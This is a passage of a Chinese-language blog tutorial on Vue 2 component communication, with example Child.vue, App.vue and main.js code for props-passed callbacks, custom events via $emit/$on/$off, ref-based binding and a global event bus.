class="string">&#x27;func&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">childFunc</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 调用父组件传递的方法</span></span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">this</span>.<span class="title function_">func</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong><code>src/App.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&quot;Vue logo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/logo.png&quot;</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">&lt;!--父组件给子组件传递必要参数以及函数便于子组件向父组件通信--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Child</span> <span class="attr">name</span>=<span class="string">&quot;划水艺术家&quot;</span> <span class="attr">:age</span>=<span class="string">&quot;age&quot;</span> <span class="attr">:func</span>=<span class="string">&quot;func&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Child</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Child</span>  <span class="keyword">from</span> <span class="string">&quot;./components/Child&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title class_">Child</span></span></span><br><span class="line"><span class="language-javascript">	&#125;,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">age</span>: <span class="number">20</span></span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">func</span>(<span class="params">name</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">this</span>.<span class="property">age</span> += <span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;子组件向父组件通信---name: &quot;</span>, name);</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815145025.png" alt="  "></p>
<hr>
<h3 id="②-自定义事件"><a href="#②-自定义事件" class="headerlink" title="② 自定义事件"></a>② 自定义事件</h3><p>父组件可在子组件上绑定自定义事件，通过触发自定义事件，完成子组件向父组件通信。</p>
<p><strong>组件的自定义事件：</strong></p>
<ul>
<li><p>一种组件间通信的方式，适用于&#x3D;&#x3D;子组件向父组件通信&#x3D;&#x3D;</p>
</li>
<li><p>绑定自定义事件：</p>
</li>
</ul>
<p>方式①，在父组件中直接使用 <code>v-on</code> 或 <code>@</code> 绑定自定义事件：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Child</span> @<span class="attr">my-event</span>=<span class="string">&quot;func&quot;</span>/&gt;</span> </span><br><span class="line">或 </span><br><span class="line"><span class="tag">&lt;<span class="name">Child</span> <span class="attr">v-on:my-event</span>=<span class="string">&quot;func&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>方式②，在父组件中引用子组件时使用 <code>ref</code> 属性，选取合适时机为子组件绑定事件：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Child</span> <span class="attr">ref</span>=<span class="string">&quot;child&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	...</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">mounted</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">child</span>.$on(<span class="string">&#x27;my-event&#x27;</span>, func)</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<ul>
<li><p>可在自定义事件上添加事件修饰符</p>
</li>
<li><p>触发自定义事件：<code>this.$emit(&#39;my-event&#39;, 数据...)</code></p>
</li>
<li><p>解绑自定义事件：</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 解绑一个自定义事件</span></span><br><span class="line"><span class="comment">// this.$off(&#x27;my-event&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解绑多个自定义事件</span></span><br><span class="line"><span class="comment">// this.$off([&#x27;my-event&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解绑所有自定义事件</span></span><br><span class="line"><span class="variable language_">this</span>.$off()</span><br></pre></td></tr></table></figure>

<ul>
<li><p>组件上也可以绑定原生DOM事件，需要使用<code>native</code>修饰符</p>
</li>
<li><p>注意：通过<code>this.$refs.xxx.$on(&#39;my-event&#39;, 回调函数)</code>绑定自定义事件时，回调函数要么配置在<code>methods</code>中，要么用&#x3D;&#x3D;箭头函数&#x3D;&#x3D;，否则<code>this</code>指向会出问题！</p>
</li>
</ul>
<p><strong>测试案例：</strong></p>
<p><strong><code>src/components/Child.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>子组件向父组件通信<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>姓名：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;childFunc&quot;</span>&gt;</span>点我年龄 + 1 并将姓名传送至父组件 App<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>: <span class="string">&quot;Child&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">props</span>:[<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">childFunc</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 触发 Child 组件实例身上的 my-event 事件</span></span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">this</span>.$emit(<span class="string">&quot;my-event&quot;</span>, <span class="variable language_">this</span>.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p><strong><code>src/App.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&quot;Vue logo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/logo.png&quot;</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">&lt;!--父组件给子组件绑定自定义事件 （绑定事件使用 v-on 与 @ 均可）--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Child</span> <span class="attr">name</span>=<span class="string">&quot;划水艺术家&quot;</span> <span class="attr">:age</span>=<span class="string">&quot;age&quot;</span> <span class="attr">v-on:my-event</span>=<span class="string">&quot;func&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Child</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Child</span>  <span class="keyword">from</span> <span class="string">&quot;./components/Child&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title class_">Child</span></span></span><br><span class="line"><span class="language-javascript">	&#125;,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">age</span>: <span class="number">20</span></span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">func</span>(<span class="params">name</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">this</span>.<span class="property">age</span> += <span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;子组件向父组件通信---name: &quot;</span>, name);</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815145031.png" alt="  "></p>
<hr>
<h3 id="③-使用ref属性绑定自定义事件"><a href="#③-使用ref属性绑定自定义事件" class="headerlink" title="③ 使用ref属性绑定自定义事件"></a>③ 使用ref属性绑定自定义事件</h3><p>在上述中绑定的自定义事件是当整个模板一被解析就直接绑定，当我们有些特别的需求，例如：在页面完成挂载5秒后才绑定事件，就需要使用<code>ref</code>属性。</p>
<p><strong>测试案例：</strong><br>与②中大致相同，只是绑定自定义事件的方式略有变化</p>
<p><strong><code>src/App.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&quot;Vue logo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/logo.png&quot;</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">&lt;!--父组件给子组件绑定自定义事件 （使用 ref ）--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Child</span> <span class="attr">name</span>=<span class="string">&quot;划水艺术家&quot;</span> <span class="attr">:age</span>=<span class="string">&quot;age&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;child&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Child</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Child</span>  <span class="keyword">from</span> <span class="string">&quot;./components/Child&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title class_">Child</span></span></span><br><span class="line"><span class="language-javascript">	&#125;,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">age</span>: <span class="number">20</span></span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">func</span>(<span class="params">name</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">this</span>.<span class="property">age</span> += <span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;子组件向父组件通信---name: &quot;</span>, name);</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// 当页面挂载完毕5秒后给 child 组件绑定事件</span></span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">mounted</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">this</span>.<span class="property">$ref</span>.<span class="property">child</span>.$on(<span class="string">&quot;my-event&quot;</span>, <span class="variable language_">this</span>.<span class="property">func</span>);</span></span><br><span class="line"><span class="language-javascript">		&#125;, <span class="number">5000</span>);</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h3 id="④-自定义事件的解绑"><a href="#④-自定义事件的解绑" class="headerlink" title="④ 自定义事件的解绑"></a>④ 自定义事件的解绑</h3><p>给哪个组件绑定的事件，就在哪个组件中完成解绑。<br>在上述案例中，所定义的自定义事件<code>my-event</code>是给Child组件绑定的，因此若想要解绑，则在Child组件中完成。</p>
<p><strong><code>src/components/Child.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>子组件向父组件通信<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>姓名：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;childFunc&quot;</span>&gt;</span>点我年龄 + 1 并将姓名传送至父组件 App<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;unbind&quot;</span>&gt;</span>解绑自定义事件<span class="tag">&lt;/<span class="name">button</span>&gt;</span> </span><br><span class="line">		</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>: <span class="string">&quot;Child&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">props</span>:[<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">childFunc</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 触发 Child 组件实例身上的 my-event 事件</span></span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">this</span>.$emit(<span class="string">&quot;my-event&quot;</span>, <span class="variable language_">this</span>.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">unbind</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 解绑一个自定义事件</span></span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// this.$off(&#x27;my-event&#x27;)</span></span></span><br><span class="line"><span class="language-javascript">			</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 解绑多个自定义事件</span></span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// this.$off([&#x27;my-event&#x27;])</span></span></span><br><span class="line"><span class="language-javascript">			</span></span><br><span class="line"><span class="language-javascript">			<span class="comment">// 解绑所有自定义事件</span></span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">this</span>.$off()</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>





<hr>
<h1 id="三、全局事件总线"><a href="#三、全局事件总线" class="headerlink" title="三、全局事件总线"></a>三、全局事件总线</h1><p><strong>全局事件总线（GlobalEventBus）：</strong></p>
<ul>
<li>一种组件间通信的方式，适用于&#x3D;&#x3D;任意组件&#x3D;&#x3D;间通信</li>
<li>本质上就是一个对象。它必须满足以下条件：<br>① 所有的组件对象都必须能看见他<br>② 这个对象必须能够使用<code>$on</code>、<code>$emit</code>和<code>$off</code>方法去绑定、触发和解绑事件</li>
</ul>
<p><strong>使用步骤：</strong></p>
<ul>
<li>安装全局事件总线：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="title function_">beforeCreate</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="comment">//安装全局事件总线 </span></span><br><span class="line">		<span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$bus</span> = <span class="variable language_">this</span> </span><br><span class="line">	&#125;,</span><br><span class="line">	...</span><br><span class="line">&#125;) </span><br></pre></td></tr></table></figure>


<ul>
<li>使用事件总线：</li>
</ul>
<p>① 接收数据：A组件想接收数据，则在A组件中给 <code>$bus</code> 绑定自定义事件，事件的回调函数留在A组件自身</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="title function_">methods</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="comment">// 自定义绑定事件的回调函数</span></span><br><span class="line">		<span class="title function_">rollbackFunc</span>(<span class="params">data</span>)&#123;...&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	...</span><br><span class="line">	<span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="comment">// 当页面挂载完成时给当前组件绑定自定义事件</span></span><br><span class="line">		<span class="variable language_">this</span>.<span class="property">$bus</span>.$on(<span class="string">&#x27;xxx&#x27;</span>,<span class="variable language_">this</span>.<span class="property">rollbackFunc</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>② 提供数据：<code>this.$bus.$emit(&#39;xxx&#39;,data)</code></p>
<ul>
<li>最好在<code>beforeDestroy</code>钩子中，用<code>$off</code>去&#x3D;&#x3D;解绑当前组件所用到的事件&#x3D;&#x3D;</li>
</ul>
<p><strong>测试案例：</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815145038.png" alt="  "></p>
<p>案例中将在<code>App.vue</code>中使用<code>Child1</code>与<code>Child2</code>组件，<code>Child1</code>与<code>Child2</code>组件互为兄弟组件，以下将展示两者如何进行通信。</p>
<p><strong><code>src/main.js</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">	<span class="attr">el</span>:<span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">	<span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>),</span><br><span class="line">	<span class="title function_">beforeCreate</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="comment">//安装全局事件总线</span></span><br><span class="line">		<span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$bus</span> = <span class="variable language_">this</span> </span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>


<p><strong><code>src/components/Child1.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>兄弟组件通信 Child-1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>Child-1 姓名：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>Child-1 年龄：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>: <span class="string">&quot;Child&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">name</span>: <span class="string">&quot;Child-1&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">age</span>: <span class="number">10</span></span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">demo</span>(<span class="params">data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我是 Child-1 组件，我收到的数据 = &quot;</span>, data);</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 当页面挂载完毕为 Child1 组件绑定事件</span></span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">this</span>.<span class="property">$bus</span>.$on(<span class="string">&quot;my-event&quot;</span>, <span class="variable language_">this</span>.<span class="property">demo</span>)</span></span><br><span class="line"><span class="language-javascript">	&#125;,</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">beforeDestroy</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 销毁前取消 Child1 组件的绑定事件</span></span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">this</span>.<span class="property">$bus</span>.$off(<span class="string">&#x27;my-event&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong><code>src/components/Child2.vue</code></strong></p>
